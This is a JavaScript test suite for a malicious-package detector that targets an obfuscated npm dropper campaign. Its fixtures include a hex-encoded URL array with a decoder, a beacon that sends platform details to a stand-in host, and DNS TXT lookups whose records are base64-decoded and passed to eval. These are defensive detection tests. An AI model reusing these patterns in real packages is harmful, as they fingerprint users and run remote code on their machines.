import { test } from 'node:test';
import assert from 'assert/strict';
import { readFileSync } from 'node:fs';
import { scan } from '../backend/detectors/tier1-ai-slop-dropper.js';
import { runAll } from '../backend/detectors/index.js';
import {
  wel1dropper,
  cleanDnsUtility,
  cleanReadmeExample,
  cleanPrebuildInstaller,
} from './fixtures/campaigns/ai-slop-wel1dropper/index.js';

function types(finding) {
  return (finding?.detail || []).map((d) => d.type);
}

// --- full campaign fixture ---------------------------------------------------

test('D28: WEL1DROPPER campaign fixture blocks at critical', () => {
  const findings = scan(wel1dropper.pkgJson, [], null, wel1dropper.allFiles);
  assert.equal(findings.length, 1);
  const [finding] = findings;
  assert.equal(finding.id, 'D28-AI-SLOP-DROPPER');
  assert.equal(finding.severity, 'critical');
  assert.equal(finding.confidence, 'HIGH');
  assert.ok(finding.recommendation.startsWith('BLOCK'));
});

test('D28: campaign fixture reports every stage of the dropper', () => {
  const [finding] = scan(wel1dropper.pkgJson, [], null, wel1dropper.allFiles);
  const detected = types(finding);
  for (const expected of [
    'encoded_string_array',
    'string_array_decoder',
    'env_fingerprint',
    'dns_txt_oob',
    'dns_payload_assembly',
    'fingerprint_network_coupling',
    'readme_directed_entry',
  ]) {
    assert.ok(detected.includes(expected), `missing signal: ${expected}`);
  }
});

test('D28: campaign fixture is surfaced through the full detector pipeline', async () => {
  const findings = await runAll(
    wel1dropper.pkgJson,
    wel1dropper.allFiles,
    null,
    wel1dropper.allFiles
  );
  const d28 = findings.find((f) => f.id === 'D28-AI-SLOP-DROPPER');
  assert.ok(d28, 'D28 finding not returned by runAll');
  assert.equal(d28.severity, 'critical');
});

// --- obfuscation / entropy ---------------------------------------------------

test('D28: dense hex string array is flagged as encoded_string_array', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const _0x21 = ['6874747073', '3a2f2f6576', '696c2e636f', '6d2f737461', '676532', '5f5f696e69', '74', '646563', '7061796c6f', '6164'];",
        "function _0xd(i) { return Buffer.from(_0x21[i], 'hex').toString(); }",
        'module.exports = _0xd;',
      ].join('\n'),
    },
  ];
  const [finding] = scan({ name: 'x' }, [], null, files);
  assert.ok(finding);
  assert.ok(types(finding).includes('encoded_string_array'));
  assert.ok(types(finding).includes('string_array_decoder'));
});

test('D28: high-entropy literals alone never fire', () => {
  const files = [
    {
      path: 'data.js',
      content: [
        "export const a = 'kJ8vQ2mR7xT4nB9wZ1cY6hL3pF5dG0sA8eU2iO7yK4jNqM6vB2xT7rE1zH9wC3lV8bXdS';",
        "export const b = '9wZ1cY6hL3pF5dG0sA8eU2iO7yK4jNqM6vB2xT7rE1zkJ8vQ2mR7xT4nB9hL3pF5dG0sA';",
        "export const c = 'pF5dG0sA8eU2iO7yK4jNqM6vB2xT7rE1zH9wC3lV8bXkJ8vQ2mR7xT4nB9wZ1cY6hL3dS';",
      ].join('\n'),
    },
  ];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

test('D28: arrays of ordinary identifiers are not treated as encoded', () => {
  // prettier ships arrays like this; base64 *shape* alone must not be enough
  const files = [
    {
      path: 'index.js',
      content:
        "module.exports = ['RegExpLiteral','BigIntLiteral','NumericLiteral','StringLiteral','DirectiveLiteral','TemplateElement','doExpressions','exportDefaultFrom','functionBind','partialApplication'];",
    },
  ];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

test('D28: minified bundles are exempt from the entropy rule', () => {
  const literal = "'kJ8vQ2mR7xT4nB9wZ1cY6hL3pF5dG0sA8eU2iO7yK4jN'";
  const minified = `var a=${literal},b=${literal},c=${literal},d=1,e=2,f=3,g=4;function h(i){return i}${'var z=1;'.repeat(60)}`;
  const [finding] = scan({ name: 'x' }, [], null, [{ path: 'bundle.min.js', content: minified }]);
  assert.ok(!finding || !types(finding).includes('high_entropy_literals'));
});

// --- fingerprint / network coupling -----------------------------------------

const BEACON = [
  "const https = require('https');",
  'function beacon() {',
  '  const p = process.platform;',
  '  const a = process.arch;',
  "  https.request({ host: 'collector.example', path: '/?p=' + p + a });",
  '}',
  'beacon();',
].join('\n');

test('D28: fingerprint/network coupling alone never fires', () => {
  // Next.js couples process.platform with dev-server network code; coupling is
  // a supporting signal only.
  assert.equal(scan({ name: 'x' }, [], null, [{ path: 'index.js', content: BEACON }]).length, 0);
});

test('D28: coupling is reported once an anchor signal is present', () => {
  const files = [
    { path: 'beacon.js', content: BEACON },
    {
      path: 'strings.js',
      content:
        "module.exports = ['6874747073','3a2f2f6576','696c2e636f','6d2f737461','676532616263','5f5f696e6974','746162636465','646563616263','7061796c6f61','6164616263'];",
    },
  ];
  const [finding] = scan({ name: 'x' }, [], null, files);
  assert.ok(finding);
  assert.ok(types(finding).includes('fingerprint_network_coupling'));
  assert.ok(types(finding).includes('encoded_string_array'));
});

test('D28: module-scope fingerprint not referenced by the network call does not couple', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const https = require('https');",
        "const isWindows = process.platform === 'win32';",
        'function fetchConfig(cb) {',
        "  https.get('https://registry.example/config.json', cb);",
        '}',
        'module.exports = { isWindows, fetchConfig };',
      ].join('\n'),
    },
  ];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

test('D28: prebuilt-binary installer is not flagged', () => {
  assert.equal(
    scan(cleanPrebuildInstaller.pkgJson, [], null, cleanPrebuildInstaller.allFiles).length,
    0
  );
});

test('D28: environment fingerprint alone produces no finding', () => {
  const files = [
    {
      path: 'index.js',
      content: 'module.exports = { platform: process.platform, arch: process.arch };',
    },
  ];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

// --- DNS / out-of-band resolution -------------------------------------------

test('D28: dns.resolveTxt outside a network utility is elevated to high', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        "dns.resolveTxt('cfg.example.com', function (e, r) { console.log(r); });",
      ].join('\n'),
    },
  ];
  const [finding] = scan({ name: 'ui-button-kit' }, [], null, files);
  assert.ok(finding);
  assert.ok(types(finding).includes('dns_txt_oob'));
  assert.equal(finding.severity, 'high');
});

test('D28: dns.resolve(host, "TXT") is recognised as an out-of-band lookup', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        'const p = process.platform;',
        "dns.resolve(p + '.cfg.example.com', 'TXT', function (e, r) { console.log(r); });",
      ].join('\n'),
    },
  ];
  const [finding] = scan({ name: 'ui-button-kit' }, [], null, files);
  assert.ok(finding);
  assert.ok(types(finding).includes('dns_txt_oob'));
});

test('D28: TXT records decoded into an execution sink block regardless of score', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        "dns.resolveTxt('stage2.example.com', function (e, records) {",
        "  const code = Buffer.from(records.join(''), 'base64').toString();",
        '  eval(code);',
        '});',
      ].join('\n'),
    },
  ];
  const [finding] = scan({ name: 'ui-button-kit' }, [], null, files);
  assert.ok(finding);
  assert.equal(finding.severity, 'critical');
  assert.ok(types(finding).includes('dns_payload_assembly'));
  assert.ok(finding.recommendation.includes('WEL1DROPPER'));
});

test('D28: safelisted DNS utility resolving TXT records is not flagged', () => {
  assert.equal(scan(cleanDnsUtility.pkgJson, [], null, cleanDnsUtility.allFiles).length, 0);
});

test('D28: safelist does not excuse payload assembly', () => {
  const files = [
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        "dns.resolveTxt('spf.example.com', function (e, records) {",
        "  eval(Buffer.from(records.join(''), 'base64').toString());",
        '});',
      ].join('\n'),
    },
  ];
  const [finding] = scan({ name: 'spf-record-check', keywords: ['dns', 'spf'] }, [], null, files);
  assert.ok(finding);
  assert.equal(finding.severity, 'critical');
  assert.ok(types(finding).includes('dns_payload_assembly'));
});

// --- README-directed entry point --------------------------------------------

test('D28: an ordinary README require() example is not a signal', () => {
  assert.equal(scan(cleanReadmeExample.pkgJson, [], null, cleanReadmeExample.allFiles).length, 0);
});

test('D28: README lure is not counted when the package declares install hooks', () => {
  const pkgJson = {
    name: 'evil-pkg',
    scripts: { postinstall: 'node ./setup.js' },
  };
  const files = [
    {
      path: 'README.md',
      content: "```js\nrequire('evil-pkg');\n```",
    },
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        "dns.resolveTxt('cfg.example.com', function (e, r) { console.log(r); });",
      ].join('\n'),
    },
  ];
  const [finding] = scan(pkgJson, [], null, files);
  assert.ok(finding);
  assert.ok(!types(finding).includes('readme_directed_entry'));
});

// --- safety / edge cases -----------------------------------------------------

test('D28: known reputable packages are exempt', () => {
  const findings = scan({ ...wel1dropper.pkgJson, name: 'react' }, [], null, wel1dropper.allFiles);
  assert.equal(findings.length, 0);
});

test('D28: unparsable and non-code files are skipped without throwing', () => {
  const files = [
    { path: 'broken.js', content: 'function ( { this is not javascript process.platform' },
    { path: 'notes.txt', content: "process.platform dns.resolveTxt('x')" },
    { path: 'types.ts', content: 'const x: string = process.platform;' },
  ];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

test('D28: empty inputs return no findings', () => {
  assert.equal(scan({}, [], null, []).length, 0);
  assert.equal(scan({}, [], null, null).length, 0);
  assert.equal(scan({}, null, null, null).length, 0);
});

test('D28: clean package produces no findings', () => {
  const files = [{ path: 'app.js', content: "console.log('hello world');" }];
  assert.equal(scan({ name: 'x' }, [], null, files).length, 0);
});

// --- campaign corpus ---------------------------------------------------------

test('D28: every package in the campaign fixture gets its expected verdict', () => {
  const lines = readFileSync(
    new URL('../fixtures/campaigns/d28-ai-slop-wel1dropper.jsonl', import.meta.url),
    'utf8'
  )
    .split('\n')
    .filter((l) => l.trim());
  assert.ok(lines.length >= 7);

  for (const line of lines) {
    const pkg = JSON.parse(line);
    const pkgJson = {
      name: pkg.name,
      version: pkg.version,
      description: pkg.description,
      keywords: pkg.keywords,
      scripts: pkg.scripts,
    };
    const [finding] = scan(pkgJson, [], null, pkg.files);
    const verdict = finding ? finding.recommendation.split(' ')[0] : 'PASS';
    assert.equal(verdict, pkg.expected, `${pkg.name} expected ${pkg.expected}, got ${verdict}`);
  }
});
